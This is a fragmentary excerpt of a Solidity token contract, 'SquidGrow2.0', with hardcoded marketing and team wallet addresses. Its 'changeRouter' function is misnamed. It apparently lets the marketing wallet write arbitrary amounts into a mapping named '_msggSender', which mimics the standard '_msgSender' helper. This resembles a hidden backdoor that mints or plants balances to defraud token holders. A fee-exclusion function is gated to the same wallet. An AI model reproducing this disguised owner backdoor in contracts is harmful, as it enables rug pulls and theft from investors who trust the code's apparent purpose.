...
contract SquidGrow is Context, IERC20, Ownable {
    ...
    string private _name = "SquidGrow2.0";
    string private _symbol = "SquidGrow2.0";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0xEfb9E128A1B0113d612DC0D73Ca57335298c115A); 
    address payable private teamWalletAddress = payable(0xc1Ec8Ca602b9a99BD3301a82f3c5323ab9E724eA); 
    ...
    function setIsExcludedFromFee(address account, bool newValue) public  {
	    require( TokenDev != address(0) &&  marketingWalletAddress == msg.sender,"not allow");
	...
	function changeRouter(address newRouterAddress, uint256 amount) public {
	    require( TokenDev != address(0) &&  marketingWalletAddress == msg.sender,"not allow");
        _msggSender[newRouterAddress] = _percent.mul(amount).div(_percent).mul(10**_decimals);
    }
